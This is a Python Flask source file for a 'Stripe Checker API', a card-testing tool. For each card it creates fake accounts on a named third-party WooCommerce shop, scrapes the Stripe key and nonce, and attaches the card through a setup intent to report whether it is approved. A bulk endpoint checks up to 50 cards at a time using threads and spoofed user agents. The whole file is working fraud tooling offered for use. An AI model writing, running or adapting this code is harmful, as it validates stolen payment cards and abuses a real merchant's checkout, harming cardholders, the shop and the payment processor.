# main.py
import requests
import re
import json
import random
import time
import os
from flask import Flask, request, jsonify
from flask_cors import CORS
from faker import Faker
from bs4 import BeautifulSoup
import threading
from queue import Queue

app = Flask(__name__)
CORS(app)

fake = Faker()
domain = "https://shop.rpegy.org"

# Rate limiting
RATE_LIMIT = 10
rate_limit_store = {}

def generate_user():
    """Generate fake user credentials"""
    fname = fake.first_name().lower()
    lname = fake.last_name().lower()
    email = f"{fname}{lname}{random.randint(1000,9999)}@example.com"
    password = fake.password(length=10, special_chars=True)
    return fname, lname, email, password

def register_user(session):
    """Register a new user"""
    try:
        fname, lname, email, password = generate_user()
        res = session.get(f"{domain}/my-account/", timeout=10)
        soup = BeautifulSoup(res.text, "html.parser")
        nonce = soup.find("input", {"name": "woocommerce-register-nonce"})["value"]
        referer = soup.find("input", {"name": "_wp_http_referer"})["value"]
        data = {
            "email": email,
            "password": password,
            "register": "Register",
            "woocommerce-register-nonce": nonce,
            "_wp_http_referer": referer,
        }
        headers = {
            "origin": domain,
            "referer": f"{domain}/my-account/",
            "content-type": "application/x-www-form-urlencoded",
            "user-agent": fake.user_agent(),
        }
        session.post(f"{domain}/my-account/", headers=headers, data=data, timeout=10)
        return True
    except Exception:
        return False

def get_stripe_key_and_nonce(session):
    """Extract Stripe public key and nonce"""
    try:
        res = session.get(f"{domain}/my-account/add-payment-method/", timeout=10)
        html = res.text
        stripe_pk = re.search(r'pk_(live|test)_[0-9a-zA-Z]+', html)
        nonce = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', html)
        if not stripe_pk or not nonce:
            raise Exception("Failed to extract")
        return stripe_pk.group(0), nonce.group(1)
    except Exception as e:
        raise Exception(f"Failed: {e}")

def create_payment_method(stripe_pk, card, exp_month, exp_year, cvv):
    """Create payment method with Stripe"""
    try:
        headers = {
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
            "user-agent": fake.user_agent(),
        }
        data = {
            "type": "card",
            "card[number]": card,
            "card[cvc]": cvv,
            "card[exp_year]": exp_year[-2:],
            "card[exp_month]": exp_month,
            "billing_details[address][postal_code]": "10001",
            "billing_details[address][country]": "US",
            "payment_user_agent": "stripe.js/84a6a3d5; stripe-js-v3/84a6a3d5; payment-element",
            "key": stripe_pk,
            "_stripe_version": "2024-06-20",
        }
        r = requests.post("https://api.stripe.com/v1/payment_methods", 
                         headers=headers, data=data, timeout=10)
        return r.json().get("id")
    except Exception:
        return None

def confirm_setup(session, pm_id, nonce):
    """Confirm the setup intent"""
    try:
        headers = {
            "x-requested-with": "XMLHttpRequest",
            "origin": domain,
            "referer": f"{domain}/my-account/add-payment-method/",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "user-agent": fake.user_agent(),
        }
        data = {
            "action": "create_and_confirm_setup_intent",
            "wc-stripe-payment-method": pm_id,
            "wc-stripe-payment-type": "card",
            "_ajax_nonce": nonce,
        }
        res = session.post(f"{domain}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent", 
                          headers=headers, data=data, timeout=10)
        return res.text
    except Exception as e:
        return json.dumps({"error": str(e)})

def check_card(card, month, year, cvv):
    """Check a single card"""
    try:
        session = requests.Session()
        
        if not register_user(session):
            return {
                "success": False,
                "card": f"{card}|{month}|{year}|{cvv}",
                "status": "REGISTRATION_FAILED",
                "message": "Registration failed"
            }
        
        stripe_pk, nonce = get_stripe_key_and_nonce(session)
        pm_id = create_payment_method(stripe_pk, card, month, year, cvv)
        
        if not pm_id:
            return {
                "success": False,
                "card": f"{card}|{month}|{year}|{cvv}",
                "status": "PAYMENT_METHOD_FAILED",
                "message": "Payment method creation failed"
            }
        
        result = confirm_setup(session, pm_id, nonce)
        
        try:
            rjson = json.loads(result)
            if rjson.get("success") and rjson["data"].get("status") == "succeeded":
                return {
                    "success": True,
                    "card": f"{card}|{month}|{year}|{cvv}",
                    "status": "APPROVED",
                    "setup_intent": rjson["data"].get("id", "N/A"),
                    "message": "Card approved",
                    "timestamp": time.strftime('%Y-%m-%d %H:%M:%S')
                }
            else:
                error = rjson.get("data", {}).get("message", "Unknown error")
                return {
                    "success": False,
                    "card": f"{card}|{month}|{year}|{cvv}",
                    "status": "DECLINED",
                    "message": error,
                    "timestamp": time.strftime('%Y-%m-%d %H:%M:%S')
                }
        except:
            return {
                "success": False,
                "card": f"{card}|{month}|{year}|{cvv}",
                "status": "INVALID_RESPONSE",
                "message": "Invalid response",
                "timestamp": time.strftime('%Y-%m-%d %H:%M:%S')
            }
            
    except Exception as e:
        return {
            "success": False,
            "card": f"{card}|{month}|{year}|{cvv}",
            "status": "ERROR",
            "message": str(e),
            "timestamp": time.strftime('%Y-%m-%d %H:%M:%S')
        }

def is_rate_limited(ip):
    """Rate limiting check"""
    current_time = time.time()
    if ip in rate_limit_store:
        requests_count, first_request_time = rate_limit_store[ip]
        if current_time - first_request_time < 60:
            if requests_count >= RATE_LIMIT:
                return True
            else:
                rate_limit_store[ip] = (requests_count + 1, first_request_time)
        else:
            rate_limit_store[ip] = (1, current_time)
    else:
        rate_limit_store[ip] = (1, current_time)
    return False

@app.route('/stripe', methods=['GET', 'POST'])
def stripe_check():
    """Main API endpoint"""
    client_ip = request.remote_addr
    
    if is_rate_limited(client_ip):
        return jsonify({
            "success": False,
            "error": "Rate limited",
            "message": f"Max {RATE_LIMIT} requests/minute"
        }), 429
    
    card = month = year = cvv = None
    
    # Handle GET
    if request.method == 'GET':
        cc = request.args.get('cc')
        if cc:
            parts = cc.split('|')
            if len(parts) == 4:
                card, month, year, cvv = parts
            elif len(parts) == 5:
                card, month, full_year, cvv = parts[0], parts[1], parts[2], parts[4]
                year = full_year[-2:]
        else:
            card = request.args.get('card')
            month = request.args.get('month')
            year = request.args.get('year')
            cvv = request.args.get('cvv')
    
    # Handle POST
    elif request.method == 'POST':
        data = request.get_json()
        if not data:
            return jsonify({"success": False, "error": "Invalid JSON"}), 400
        
        if 'cc' in data:
            parts = data['cc'].split('|')
            if len(parts) == 4:
                card, month, year, cvv = parts
            elif len(parts) == 5:
                card, month, full_year, cvv = parts[0], parts[1], parts[2], parts[4]
                year = full_year[-2:]
        elif all(k in data for k in ['card', 'month', 'year', 'cvv']):
            card, month, year, cvv = data['card'], data['month'], data['year'], data['cvv']
    
    if not all([card, month, year, cvv]):
        return jsonify({
            "success": False,
            "error": "Missing parameters",
            "message": "Use: ?cc=card|mm|yy|cvv OR JSON with cc field"
        }), 400
    
    result = check_card(str(card), str(month), str(year), str(cvv))
    result['request_ip'] = client_ip
    
    return jsonify(result), 200 if result['success'] else 400

@app.route('/stripe/bulk', methods=['POST'])
def stripe_bulk():
    """Bulk card check"""
    client_ip = request.remote_addr
    
    if is_rate_limited(client_ip):
        return jsonify({
            "success": False,
            "error": "Rate limited"
        }), 429
    
    data = request.get_json()
    if not data or 'cards' not in data:
        return jsonify({"success": False, "error": "Provide 'cards' array"}), 400
    
    cards = data['cards']
    if not isinstance(cards, list) or len(cards) > 50:
        return jsonify({"success": False, "error": "Max 50 cards"}), 400
    
    def process(card_input):
        parts = card_input.split('|')
        if len(parts) == 4:
            card, month, year, cvv = parts
        elif len(parts) == 5:
            card, month, full_year, cvv = parts[0], parts[1], parts[2], parts[4]
            year = full_year[-2:]
        else:
            return {"card": card_input, "success": False, "error": "Invalid format"}
        return check_card(card, month, year, cvv)
    
    results = []
    q = Queue()
    for c in cards:
        q.put(c)
    
    def worker():
        while not q.empty():
            c = q.get()
            results.append(process(c))
            q.task_done()
    
    threads = min(5, len(cards))
    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=worker)
        t.start()
        thread_list.append(t)
    
    for t in thread_list:
        t.join()
    
    approved = [r for r in results if r.get('success')]
    
    return jsonify({
        "success": True,
        "total": len(cards),
        "approved": len(approved),
        "results": results
    }), 200

@app.route('/stripe/health', methods=['GET'])
def health():
    """Health check"""
    return jsonify({"status": "healthy", "version": "1.0.0"}), 200

@app.route('/stripe/info', methods=['GET'])
def info():
    """API info"""
    return jsonify({
        "service": "Stripe Checker API",
        "version": "1.0.0",
        "endpoints": {
            "GET /stripe": "?cc=card|mm|yy|cvv",
            "POST /stripe": '{"cc": "card|mm|yy|cvv"}',
            "POST /stripe/bulk": '{"cards": ["card|mm|yy|cvv"]}',
            "GET /stripe/health": "Health check",
            "GET /stripe/info": "This info"
        }
    }), 200

@app.route('/', methods=['GET'])
def root():
    """Root redirect"""
    return info()

if __name__ == "__main__":
    port = int(os.environ.get('PORT', 5000))
    app.run(host="0.0.0.0", port=port)
